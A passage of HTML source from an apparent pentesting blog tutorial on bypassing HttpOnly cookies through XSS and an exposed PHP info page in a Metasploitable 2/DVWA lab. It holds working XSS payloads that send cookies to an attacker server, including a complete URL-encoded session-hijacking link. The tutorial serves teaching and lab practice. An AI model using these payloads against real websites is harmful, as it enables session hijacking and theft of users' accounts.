-&lt;p&gt;but… Why are we not seeing the value of the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie? That’s because the value &lt;em&gt;true&lt;/em&gt; in the &lt;em&gt;HttpOnly&lt;/em&gt; flag of the cookie &lt;em&gt;PHPSESSID&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;HttpOnly&lt;/em&gt; is an additional flag included in a Set-Cookie HTTP response header. Using the &lt;em&gt;HttpOnly&lt;/em&gt; flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie (if the browser supports it). You can check more information about the &lt;em&gt;HttpOnly&lt;/em&gt; flag in the following link&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://owasp.org/www-community/HttpOnly&quot;&gt;Link of OWASP about the HttpOnly flag&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;For those who do not do web pentesting or who do not regularly deal with XSS, this flag may not be familiar, but for those of us who are used to looking for and reporting these vulnerabilities in bug bounty programs, this flag is the main problem we encounter when it comes to finding a real impact in an XSS.&lt;/p&gt;
-
-&lt;p&gt;Take a look at the following code&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-   &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.129/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This code is a very common way to try to exfiltrate the user cookies during an XSS exploitation. This code is executed in the client side (XSS is a client side vulnerability) and try to import a image from the IP 192.168.240.129, which is the IP of my Kali. The requested path is the user cookies encoded in &lt;em&gt;base64&lt;/em&gt;. The &lt;em&gt;base64&lt;/em&gt; encoding is not strictly necessary but it can be useful for passing data in URLs when the data includes non-url friendly characters.&lt;/p&gt;
-
-&lt;p&gt;So if we set up a web server in our Kali through the command&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;python3 -m http.server 80
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;like in the following screenshot&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/python-web-server.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;and we write the payload&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.129/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and we click &lt;em&gt;Submit&lt;/em&gt;, we can see that a GET request has been printed in the web server, like in the following screenshot&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The path of the GET request is the &lt;em&gt;base64&lt;/em&gt; encoded form of the user cookies, so decoding it with the burpsuite decoder we can get the user cookies&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-decoded-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As you can see, only the &lt;em&gt;security&lt;/em&gt; cookie is displayed and not the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie. That’s because the &lt;em&gt;HttpOnly&lt;/em&gt; flag of the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-2-2&quot; /&gt;
-
-&lt;h2 id=&quot;22-exfiltrating-the-cookies-bypassing-the-httponly-flag-through-the-php-info-page&quot;&gt;2.2. Exfiltrating the cookies bypassing the HttpOnly flag through the PHP info page&lt;/h2&gt;
-
-&lt;p&gt;Ok, we can’t get the cookies from the &lt;em&gt;document&lt;/em&gt; object. Is there another place where we can get the cookies?&lt;/p&gt;
-
-&lt;p&gt;In &lt;em&gt;Metasploitable 2&lt;/em&gt; there is a PHP info page disclosure in the path &lt;em&gt;/dvwa/phpinfo&lt;/em&gt;. In my case, it’s in the URL&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.240.128/dvwa/phpinfo
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.php.net/manual/en/function.phpinfo.php&quot;&gt;PHP info page&lt;/a&gt; is a page that outputs information about PHP’s configuration and is a valuable debugging tool as it contains all EGPCS (Environment, GET, POST, Cookie, Server) data. If you take a look at the page you will see that your cookies appear in several places, for example in&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-dvwa-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;Make a request to the URL&lt;/p&gt;
-
-    &lt;div class=&quot;code-header&quot;&gt;
-   &lt;button class=&quot;copy-code-button&quot;&gt;
-     Copy
-   &lt;/button&gt;
- &lt;/div&gt;
-    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.240.128/dvwa/phpinfo
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Take the portion of the PHP info page that contains the user cookies.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Encode this portion in &lt;em&gt;base64&lt;/em&gt;.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Send this encoded string to the malicious server, that is, our Kali.&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;That is what the following code does&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Initializes the request object&lt;/span&gt;
-   &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reqListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Set the listener reqListener that is triggered when the response is ready&lt;/span&gt;
-   &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.128/dvwa/phpinfo&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Initializes the URL of the PHP info page&lt;/span&gt;
-   &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;withCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Send the cookie header&lt;/span&gt;
-   &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// The request will be sent to the PHP info page of Metasploitable 2 (192.168.240.128) through the GET method synchronously&lt;/span&gt;
-   &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Send the request&lt;/span&gt;
-   &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reqListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Initializes the request object&lt;/span&gt;
-      &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;HTTP_COOKIE&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Store in the variable sess the result of encoding in base64 the portion of the PHP info page between the first appearance of the word HTTP_COOKIE and the final of the page&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.129/?data=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// The request will be sent to the Kali (192.168.240.129) through the GET method synchronously&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Send the request&lt;/span&gt;
-   &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;that I have taken from the blog of Aleksi Kistauri&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/metasploitable-2,29/&quot;&gt;Link to Aleksi Kistauri’s blog post&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;making some minor modifications. This code could probably be optimized to be more precise in taking the exact part of the PHP info page that contains the cookies but it would also be longer.&lt;/p&gt;
-
-&lt;p&gt;So if we set up a web server in our Kali through the above command, we write the payload&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reqListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.128/dvwa/phpinfo&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;withCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reqListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;HTTP_COOKIE&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.129/?data=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()};&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and we click on &lt;em&gt;Submit&lt;/em&gt;, we can see that a GET request has been printed in the web server, like in the following screenshot&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The value of the parameter &lt;em&gt;data&lt;/em&gt; is the &lt;em&gt;base64&lt;/em&gt; encoded form of the user cookies (and a lot of HTML code but not relevant), so decoding it with the burpsuite decoder we can get the user cookies&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-decoded-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As you can see, all the cookies has been displayed, so we have bypassed the &lt;em&gt;HttpOnly&lt;/em&gt; flag of the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie. Therefore, anyone who clicks on the URL&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.240.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Evar+req+%3D+new+XMLHttpRequest%28%29%3Breq.onload%3DreqListener%3Bvar+url%3D%22http%3A%2F%2F192.168.240.128%2Fdvwa%2Fphpinfo%22%3Breq.withCredentials%3Dtrue%3Breq.open%28%22GET%22%2Curl%2Cfalse%29%3Breq.send%28%29%3Bfunction+reqListener%28%29+%7Bvar+req2%3Dnew+XMLHttpRequest%28%29%3Bconst+sess%3Dthis.responseText.substring%28this.responseText.indexOf%28%22HTTP_COOKIE%22%29%29%3Breq2.open%28%22GET%22%2C%22http%3A%2F%2F192.168.240.129%2F%3Fdata%3D%22%2Bbtoa%28sess%29%2Cfalse%29%3Breq2.send%28%29%7D%3B%3C%2Fscript%3E#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;will be sending us their cookies associated with &lt;em&gt;DVWA&lt;/em&gt;, including the session cookie and therefore we will have achieved a session hijacking.&lt;/p&gt;
-
-&lt;p&gt;Obviously this is a test environment and no one is going to click on that link except me, and even if someone did click on it nothing would happen because that IP address is a private IP address. But imagine this situation in a public website of an important company and an attacker sending a link like this using social engineering through Twitter, Linkedin, Facebook… and sending the user’s cookies to an own server.&lt;/p&gt;
-
-&lt;p&gt;Do you still think that PHP info page disclosure is not an important vulnerability?&lt;/p&gt;
-
-&lt;div id=&quot;section-id-2-3&quot; /&gt;
-
-&lt;h2 id=&quot;23-using-my-github-tool-to-generate-an-improved-payload&quot;&gt;2.3. Using my Github tool to generate an improved payload&lt;/h2&gt;
-
-&lt;p&gt;As you can see, the payload used in the previous section is not quite accurate since it returns not only cookies but also a lot of non-relevant HTML code. That is why I have uploaded the following tool to Github&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/HackCommander/PHP-info-cookie-stealer&quot;&gt;Link to the tool PHP-info-cookie-stealer&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;To avoid repeating the same thing, if you want to know how the tool works you can see the README.md and you can give a star to the project :blush:. In this case, cloning the repo and running the following command&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;./generate-javascript-payload.sh http://192.168.240.128/dvwa/phpinfo.php http://192.168.240.129/
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;you will get the following XSS payload&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
